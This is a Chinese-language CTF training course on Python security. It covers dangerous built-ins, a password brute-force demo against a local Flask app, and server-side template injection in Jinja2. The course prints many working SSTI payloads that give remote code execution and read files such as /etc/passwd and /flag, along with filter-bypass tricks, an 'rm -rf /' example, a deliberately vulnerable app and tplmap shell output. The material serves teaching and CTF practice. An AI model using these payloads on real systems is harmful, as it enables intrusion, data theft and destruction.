<meta name="referrer" content="no-referrer">

# Python安全 - CTF培训
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753185347054-1afc5ddf-452f-426a-80af-251f43ffea3f.png)

> By HnuSec
> https://www.bx33661.com/blog/z8x9w23/

## 课程介绍
### 🎯 课程目标
本课程旨在帮助同学们从0开始，了解和掌握 Python 在 Web 安全与 CTF 竞赛中的核心安全知识与攻防技巧。

学习过程中，将通过实战案例、漏洞原理解析、CTF 题目演练等方式，掌握以下能力：

+ 理解 Python 语言自身的特性与潜在安全隐患；
+ 掌握常见的 Python 安全漏洞类型及其利用方式；
+ 了解 Python Web 开发常见风险点（如模板注入、反序列化等）；
+ 掌握 CTF 中出现频率较高的 Python 安全题型的解题思路；
+ 培养安全意识与防御思维，提升代码审计能力。



### 🛠️ 0. 环境准备与依赖安装
> 为了更高效地参与本课程的学习与实战演练，请大家在课前完成以下环境准备和基础知识补充：
>

建议使用 **本地 Linux / WSL / 虚拟机环境**

本课程推荐使用 **Miniconda** 来创建隔离的 Python 学习环境，避免污染全局依赖。

#### ✅ 创建并激活课程环境：
```bash
conda create -n pysec-ctf python=3.11 -y
conda activate pysec-ctf
```



或者是

+ ✅ 安装软件/工具：
    - Python 3.8+（建议使用 [pyenv](https://github.com/pyenv/pyenv) 管理多个版本）
    - pip / pipx
    - Git
    - 常用编辑器：VSCode，Pycharm 等等
    - Burp Suite（用于 Web 安全测试）

requests、flask、jinja2 等基础库

```python
pip install requests flask jinja2
```

📌建议统一使用 Python 虚拟环境（如 `venv` 或 `virtualenv`）管理依赖。





### 小 demo
为了更好理解整个流程，大家熟悉整个漏洞复现，漏洞利用，环境搭建的整个过程

[vulhub/gradio/CVE-2024-1561 at master · vulhub/vulhub](https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2024-1561)

大家可以参考这个 vulhub 靶场去复现一下 CVE-2024-1561 漏洞

具体复现细节见

写了一个小小流程示例，没有具体代码分析，为的就是会利用，知道流程

[CVE-2024-1561复现 - BX](https://www.bx33661.com/blog/CVE-2024-1561/)



## Python 应用
### Python 脚本演示
Python 在 CTF 中比赛中是脚本的主要实现语言

> 爆破密码登录账号的例子
>

flask 简单登录逻辑实现

```python
# server.py
from flask import Flask, request
app = Flask(__name__)
users = {'alice': '123456'}           # 只一个弱口令

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form['u'], request.form['p']
    return 'OK' if users.get(u) == p else 'NO'

if __name__ == '__main__':
    app.run(port=8888)

```

爆破脚本如下

```python
# brute.py
import requests, sys
URL="http://127.0.0.1:8888/login"
USER= ['admin','alice']

DEFAULT_WORDLIST = [
    '123456', 'password', 'qwerty', 'letmein', 'admin', 'iloveyou', 'welcome', 'password123'
]
words = DEFAULT_WORDLIST
for i in USER:
    for pwd in words:
        print("尝试用户",i,"密码",pwd)
        if "OK" in requests.post(URL, data={"u": i, "p": pwd}).text:
            print("密码找到了:", pwd)
            break
        else:
            print("密码错误:", pwd)
    print("用户",i,"密码爆破完成")

```

最后响应

```python
❯ python .\baopao.py
尝试用户 admin 密码 123456
密码错误: 123456
尝试用户 admin 密码 password
密码错误: password
尝试用户 admin 密码 qwerty
密码错误: qwerty
尝试用户 admin 密码 letmein
密码错误: letmein
尝试用户 admin 密码 admin
密码错误: admin
尝试用户 admin 密码 iloveyou
密码错误: iloveyou
尝试用户 admin 密码 welcome
密码错误: welcome
尝试用户 admin 密码 password123
密码错误: password123
用户 admin 密码爆破完成
尝试用户 alice 密码 123456
密码找到了: 123456
用户 alice 密码爆破完成
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753186715152-2f9c96d7-1fc3-4a51-a710-6eb81ba14e2b.png)

## Python 的特性
### 一切皆对象
+ 基本类型如 `int`, `str`, `list`, `function`, `module` 都是对象。
+ 每个对象都可以访问其类（`__class__`）与继承链（`__mro__`）等元信息。

> 这部分重点看 SSTI 中演示
>



### 高度动态的运行环境（Dynamic Execution）
+ 支持运行时执行字符串：`eval()`、`exec()`、`compile()`
+ 可以动态导入模块：`__import__('os')`

📌 **在漏洞中可能被滥用：**

```plain
eval("os.system('ls')")
__import__('os').system('whoami')
```

> 攻击者可通过构造对象链访问 `eval`、`os.system`、`__import__` 等功能函数
>

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753179826202-db1db925-336b-488d-b6e5-8e6f7d417bd2.png)





这里介绍一下 Python 的“危险函数”

| 函数 | 功能 | 返回值 | 风险等级 | 常见于攻击场景 |
| --- | --- | --- | --- | --- |
| `eval()` | 执行表达式 | 返回结果 | 🔥🔥🔥 | SSTI、反序列化、Webshell |
| `exec()` | 执行语句代码块 | 无返回 | 🔥🔥🔥🔥 | 模板注入、反射创建对象 |
| `compile()` | 将字符串编译为代码对象 | 代码对象 | 🔥 | 高级动态执行 |
| `__import__()` | 动态导入模块 | 模块对象 | 🔥🔥🔥 | 绕过检测、命令执行 |
| `os.system()` | 执行系统命令（无回显） | 返回码 | 🔥🔥🔥 | Webshell、SSTI |
| `subprocess.*()` | 执行系统命令（可捕获输出） | 输出/状态码 | 🔥🔥🔥🔥 | 高级RCE、文件读写、持久化 |
| `input()`（Py2） | 动态输入执行 | 用户输入 | 🔥🔥 | Python2特有漏洞点 |


#### 📌 1. eval(expr)
+ **功能：** 执行字符串表达式，并返回结果。
+ **语法：** `eval("1 + 2") → 3`
+ **本质：** 执行表达式（Expression），返回值。

⚠️ **危险性：高**

+ 若拼接用户输入，极易被注入执行恶意代码。
+ 常见于模板注入、命令注入、Webshell。

🧪 **利用示例：**

```python
eval("__import__('os').system('whoami')")
```

---

#### 📌 2. exec(code)
+ **功能：** 执行一段代码（可包含多行、语句块）。
+ **语法：**

```python
exec("for i in range(3): print(i)")
```

+ **本质：** 执行语句（Statement），**无返回值**。

⚠️ **危险性：极高**

+ 可动态创建变量、函数、类，甚至修改上下文环境。
+ 比 `eval` 更强大、也更危险。

🧪 **攻击示例：**

```python
exec("__import__('os').system('rm -rf /')")
```

---

#### 📌 3. compile(source, filename, mode)
+ **功能：** 将字符串编译成可执行代码对象。
+ **常配合 eval/exec 使用**。
+ **mode:** `"eval"` / `"exec"` / `"single"`

🧪 **例子：**

```python
code = compile("print('hello')", "<string>", "exec")
exec(code)
```

⚠️ **危险性：中**

+ 本身不执行，但常用于构建动态代码流程。

---

#### 📌 4. **import**('modulename')
+ **功能：** 动态导入模块，相当于 `import modulename`
+ **在安全漏洞中可用于：**
    - 绕过静态分析工具
    - 动态调用系统模块

🧪 **例子：**

```python
os = __import__('os')
os.system('whoami')
```

⚠️ **危险性：高**

+ 通常与 `eval()`、`getattr()` 等组合使用，从用户输入导入任意模块。

---

#### 📌 5. os.system(cmd)
+ **功能：** 调用系统 shell 执行命令（平台相关）
+ **返回值：** Shell 的退出码（不是命令输出）

🧪 **例子：**

```python
import os
os.system('ls')
```

⚠️ **危险性：高**

+ 执行命令无回显，适合静默攻击。
+ 容易造成远程命令执行（RCE）。

---

#### 📌 6. subprocess 系列（推荐攻击者使用）
+ 比 `os.system` 更强大，可获取命令输出。

```python
import subprocess
output = subprocess.check_output("whoami", shell=True)
```

其他变种：

+ `subprocess.call()`
+ `subprocess.run()`
+ `subprocess.Popen()`

⚠️ **危险性：极高**

+ 支持输入输出控制、环境变量控制，利于构造复杂攻击链。

---

#### 📌 7. input()
+ Python 2 中 `input()` 相当于 `eval(raw_input())`
+ 可造成代码执行（已废弃）

```python
# Python 2 中
>>> input(">>> ")  
__import__('os').system('whoami')  # 被执行！
```





## 🏗️ SSTI 漏洞了解
> “一次模板、一条语句、一条命令。”
>

---

### 什么是 SSTI？
| 术语 | 全称 | 定义 |
| --- | --- | --- |
| SSTI | **Server-Side Template Injection** | 用户输入被**直接拼接**到服务器模板代码中，未经转义或沙箱隔离，导致模板引擎**解析并执行**攻击者可控的表达式。 |


+ **本质**：模板→数据替换 的过程被逆转：  
数据（用户可控）→ 模板语法 → 引擎解析 → **代码执行**（RCE）。



### 什么是模板，如何理解模板


**模板**就是一段带有**占位符**的字符串，模板引擎会用实际数据替换这些占位符，然后生成最终的 HTML 页面或文本内容。

举个例子（以 Jinja2 为例）：

```plain
Hello, {{ name }}!
```

如果变量 `name = "bx"`，那么模板引擎渲染后会输出：

```plain
Hello, bx!
```

How to Work?

1. **模板文件**
2. **传入数据**
3. **模板引擎渲染**
4. **输出内容**

比如在 Flask 中使用 Jinja2：

```python
from flask import render_template

@app.route('/')
def index():
    return render_template('hello.html', name='bx king')
```

对应模板：

```html
<h1>Hello {{ name }}</h1>
```

渲染后浏览器看到的是：

```html
<h1>Hello bx king</h1>
```



**漏洞形成流程图**

[文本绘图-展示漏洞成因](https://www.mermaidchart.com/play?utm_source=mermaid_js&utm_medium=editor_selection&utm_campaign=playground#pako:eNqrVkrOT0lVslJKL0osyFAIcYnJUwACx-jnU1Y869j-Yt_kp61LYxV0de1qnk1f8GJ_-7PdS2oUnKKfrVj4bO7-p3umPpvcFwvR4wRSpeAc_WzHpmfzJ4N0tu9ClqopSKzMyU9MsYXofbF-7bPNU2sUXKKf7F78fEHjs87lLxb26Ac5uwI1KdUCAGP0Scs)

![](https://cdn.nlark.com/yuque/__mermaid_v3/1363e5808649bdc326390a9941f588d3.svg)

模板引擎速查表与语法指纹

| 语言 | 常见引擎 | 识别语法 | 快速 PoC |
| --- | --- | --- | --- |
| Python | Jinja2 / Mako | `{{7*7}}` → `49` | `{{ ''.__class__.__mro__[1].__subclasses__()[...]` |
| PHP | Twig / Smarty | `{{7*7}}` / `{{$smarty}` | `{{_self.env.setCacheDir("/tmp")}}` |
| Java | FreeMarker | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Node.js | Nunjucks / EJS | `<%= 7*7 %>` | `{{range.constructor("return process.mainModule.require('child_process').execSync('id')")()}}` |




### Jinja2 经典利用链（含命令执行）
> 以 Python + Flask（Jinja2）为示例
>

基本信息泄露

```python
{{ config.items() }}
```

RCE（Python3 链）

```python
{% set x=globals.__builtins__.open('/etc/passwd').read() %}{{x}}
```

最通用的 os.popen 链

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

| Stage | Explanation |
| --- | --- |
| `self` | Jinja2 内建对象 |
| `.__init__` | ⇒ 函数对象 |
| `.__globals__` | ⇒ 全局命名空间 |
| `.__builtins__.os` | 获得 os 模块 |
| `popen` | ⇒ RCE |




### 漏洞检测


漏洞检测

| 测试点 | 操作 | 现象 |
| --- | --- | --- |
| 数学表达式 | `{{7*7}}` | 输出 `49` 或异常 |
| 报错信息 | `{{7/0}}` | 泄露模板引擎类型、源码路径 |
| 对象链 | `{{ ''.__class__ }}` | 返回 `<class 'str'>` 等 |




#### 手段--手工
常见姿势

+ URL 参数

```python
http://example.com/page?name={{7*7}}
```

+ 表单字段

```python
<input name="username" value="{{7*7}}">
```

+ Cookie 注入

```python
Set-Cookie: session={{7*7}}
```

+  HTTP 头部注入  

```python
User-Agent: {{7*7}}
```



#### 自动化工具
1. Fenjing（这个推荐大家多看看）

[GitHub - Marven11/Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF](https://github.com/Marven11/Fenjing)

+ 用于检测 Flask/Jinja2 等模板引擎的 SSTI 漏洞
+ 支持对 GET、POST 请求的 fuzz 测试
+ 可自定义 payload 模板进行批量注入测试





2. Tplmap

[Github-Tplmap](https://github.com/epinna/tplmap)

+ 支持多种模板引擎（Jinja2, Twig, Velocity, Smarty 等）
+ 自动化识别模板引擎类型，并尝试执行命令
+ 可用于本地调试模板注入链路



3.  BurpSuite 插件  

结合 bp 自动化测试



....



### 防御与修复
| 措施 | 示例 |
| --- | --- |
| **沙箱 + 白名单** | Jinja2 `SandboxedEnvironment` |
| **纯数据注入** | 用 `{{ user.name }}` 而非 `{{ user }}` |
| **模板分隔符转义** | 替换 `{{`、`{%` 为 `{[{`、HTML entity |
| **严格输出编码** | `{{ user.comment |
| **禁止危险 globals** | 禁掉 `__builtins__`、`__import__`、`open` |




### 课堂演示
> 一个 flask 随便起的例子
>

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/ssti')
def ssti_vuln():
    name = request.args.get('name', 'World')
    # 危险：直接将用户输入传入模板
    template = f"Hello, {name}!"
    return render_template_string(template)

# SSTI探测payload
basic_payloads = [
    "{{7*7}}",           # 基础测试，应返回49
    "{{7*'7'}}",         # 字符串重复，应返回7777777
    "${7*7}",            # 其他模板引擎测试
    "#{7*7}",            # Ruby ERB测试
]

# Jinja2信息收集payload
info_gathering = [
    "{{config}}",                    # Flask配置信息
    "{{self}}",                      # 模板上下文
    "{{request}}",                   # 请求对象
    "{{g}}",                         # Flask全局对象
    "{{session}}",                   # 会话信息
    "{{config.items()}}",            # 配置项详情
]

print("SSTI基础payload,你可以尝试访问/ssti,get传参")
print("探测payload:", basic_payloads)
print("信息收集payload:", info_gathering[:3])

if __name__ == '__main__':
    app.run(debug=True)
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753178460404-b95e2574-df9b-4aef-ad26-61ee3017fdcf.png)







### 实战演练靶场
> 可以具体看一下
>

1. NSSCTF-web 部分
2. BUUCTF-web 部分
3. Damn Vulnerable Web Application - **DVWA**
4. PortSwigger Labs - **「Server-side template injection」章节**

[**https://portswigger.net/web-security/all-topics**](https://portswigger.net/web-security/all-topics)

5. Hack The Box - **「Jeeves」靶机**



## SSTI 深入学习
### Python 链子介绍
:::info
Python-万物皆对象

:::

```python
{{ ''.__class__ }}                          # str 类
{{ ''.__class__.__mro__ }}                 # 查看类继承顺序
{{ ''.__class__.__mro__[1] }}              # object 类
{{ ''.__class__.__mro__[1].__subclasses__() }}  # 所有子类列表
```

### 绕过
基类

```python
__mro__[-1]
__base__
__bases__[0]
```

`.` 被ban

```python
''.__class__ = ''['__class__']
''.__class__ = ''|attr('__class__')
```

利用这两种方法

```python
1、用[]代替.
{{"".__class__}}={{""['__class']}}
2、用attr()过滤器绕过，举个例子
{{"".__class__}}={{""|attr('__class__')}}
```

`_` 被ban

```python
1、通过list获取字符列表，然后用pop来获取_，举个例子
{% set a=(()|select|string|list).pop(24)%}{%print(a)%}
2、可以通过十六进制编码的方式进行绕过，举个例子
{{()["\x5f\x5fclass\x5f\x5f"]}} ={{().__class__}}
```



**赋值方法：**

这个主要用于单双引号被ban的情况

+ `request.args.x`,传递get参数
+ `request.cookies.x`，=传递cookie参数
+ `request.values.x`，传递post参数



**花括号{}被ban**：

在jinjia引擎中可以使用`{%    %}`

```python
{%print("".__.....)%}
```



**编码**

```python
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
```

贴一个脚本：

```python
def string_to_hex(s):
    # 将字符串编码为十六进制形式，每个字符被转为两个十六进制数
    return s.encode('ascii').hex()

def hex_to_string(s):
    # 将十六进制字符串解码回普通字符串
    return bytes.fromhex(s).decode('ascii')

# 示例
normal_string = "__class__"
hex_string = string_to_hex(normal_string)
print(f"Original: {normal_string}")
print(f"Hex: {hex_string}")

# 转换回来以验证
decoded_string = hex_to_string(hex_string)
print(f"Decoded: {decoded_string}")

# 输出处理成类似 \x 格式
def string_to_hex_with_slashes(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)

# 测试
print("Hex with slashes:", string_to_hex_with_slashes(normal_string))
```



直接方法

```python
{{lipsum.__globals__['os'].popen('tac ../flag').read()}}
{{lipsum.__globals__['o''s']['po''pen']('ls').read()}}
#request对象的方法绕过

{{cycler.__init__.__globals__.os.popen('ls /').read()}}

{{ config.__class__.__init__.__globals__['o''s']['pop''en']('ls /').read() }}                                                                                                                                                                                                       


#flask
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")}}{% endif %}{% endfor %}
                                                                                                                                                                                                        
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}                                                                                                                                                                                                       
```

...

还有很多很多





### 题目实战
#### NSSCTF--[HNCTF 2022 WEEK2]ez_SSTI
1. 手工

Payload:

```plain
?name={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20app.py%27).read()}}
```

我看了一下`app.py`

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/")
def app_index():
    name = request.args.get('name')
    blacklist = []

    if name:
        for forbidden_name in blacklist:
            if forbidden_name in name:
                return 'Hacker'

    template = '''
    {% block body %}
    <div class="center-content error">
        <h1>WELCOME TO HNCTF</h1>
        <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python" id="test" target="_blank">
            What is server-side template injection?
        </a>
        <h3>%s</h3>
    </div>
    {% endblock %}
    ''' % name

    return render_template_string(template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```



2. 利用工具--fenjing

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160076-ce84e70f-b33a-424a-8906-21f91f19bdc7.png)



#### [安洵杯 2020]Normal SSTI
1. 使用Fenjing

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160101-a588a080-3f7c-4a45-89ac-c99c1282479d.png)



#### [HNCTF 2022 WEEK3]ssssti
1. 使用使用Fenjing

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160235-59de95c9-1205-423e-8e36-0a205215062b.png)



#### CTFSHOW----web361
##### 手工
```plain
?name={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20/%27).read()%20}}

###
Hello
app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
###
```

打开文件

```plain
?name={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/flag%27).read()%20}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160046-e561750c-1c26-4b73-bd81-94c16b2eb1c6.png)

##### 使用Tplmap
```bash
python2 tplmap.py -u 'https://727c5e75-4ba9-40ce-8fe3-dafdafd6990d.challenge.ctf.show/?name'
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160120-a4c89a82-5c93-4abf-ab54-3becdb814d0c.png)

```bash
#直接获取shell
python2 tplmap.py -u 'https://727c5e75-4ba9-40ce-8fe3-dafdafd6990d.challenge.ctf.show/?name' --os-shell

[+] Run commands on the operating system.
posix-linux $ ls
app.py
posix-linux $ ls /
\app
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
posix-linux $ cat /flag
ctfshow{82f81a13-a157-49a5-ba00-cb23de3238cb}
```



## 参考文章&学习资料
+ HelloCTF

[https://hello-ctf.com/hc-web/ssti/](https://hello-ctf.com/hc-web/ssti/)

+ 跳跳糖社区

[FLask SSTI从零到入门 - 跳跳糖](https://tttang.com/archive/1698/)

+ 

[Python新人学习-安全分析-第一部分 - BX](https://www.bx33661.com/blog/z8x9w23/)



## 其他知识
这部分就是比较零碎的了

### Python 版本切换
> 这里介绍一下 Pyenv 工具
>

只说明一下具体命令

安装 Python 版本

```python
pyenv install 3.10.13
pyenv install 3.12.3
```

列出可用版本：

```bash
pyenv install --list
```

---

🔁 设置版本

+ **设置全局默认版本：**

```python
pyenv global 3.10.13
```

+ **设置当前 shell 会话使用的版本：**

```bash
pyenv shell 3.12.3
```

+ **设置某个项目目录的版本（会创建 **`**.python-version**`** 文件）：**

```bash
pyenv local 3.12.3
```

---

查看当前使用的版本

```python
pyenv versions    # 查看已安装的所有版本
pyenv version     # 当前正在使用的版本
```



### flask-session 伪造问题
> 对于 flask 框架的深入
>

[Flask之session伪造 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/331823.html)

[GitHub - noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager)





### Python 内存马问题
...



### 📚 Python 安全内容
本课程内容覆盖基础、漏洞原理、高级利用与 CTF 实战四大模块，具体包括：

+ ✅ Python语言基础与安全特性
    - 数据类型与作用域
    - `eval` / `exec` 等内置函数风险
    - 动态执行与类型转换陷阱
+ ✅ Python高级特性与安全隐患
    - 反射机制与魔术方法
    - `__import__` 与模块滥用
    - introspection（自省）与代码注入
+ ✅ Python内存管理与安全
    - 引用计数与垃圾回收机制
    - 内存泄漏、对象生命周期与漏洞场景
+ ✅ Python并发编程与安全
    - `threading`, `multiprocessing`, `asyncio`
    - 线程安全问题与共享资源管理
+ ✅ 常见的Python应用场景与安全风险
    - Web 后端 / 脚本自动化 / 数据处理中的误用问题
    - 风险案例解析：权限绕过、命令注入、信息泄露等
+ ✅ SSTI（服务器端模板注入）
    - 常见模板引擎：Jinja2、Tornado Templates
    - Payload 构造与远程命令执行
+ ✅ Python反序列化漏洞
    - `pickle` / `marshal` / `yaml` 等模块的风险对比
    - CTF中基于`pickle.loads()`的利用技巧
+ ✅ Python沙箱逃逸
    - 沙箱设计思路与常见绕过点
    - 动态代码执行限制的逃逸方法
+ ✅ Python原型链污染（Prototype Pollution）
    - 类属性注入与动态对象污染
    - Python 与 JS 中该漏洞的对比解析
+ ✅ Python Web框架安全问题
    - Flask / Django 的配置与路由漏洞
    - Session伪造、调试模式RCE、静态文件绕过
+ ✅ CTF中的Python安全挑战
    - 沙箱题、模板注入题、反序列化题
    - 解题技巧：构造Payload、源代码审计、黑盒分析等
+ ✅ 总结与防御措施
    - Python安全编码规范
    - 常用静态/动态审计工具（如 Bandit、pylint、pyre-check 等）
    - 安全开发生命周期与持续集成中的防御机制











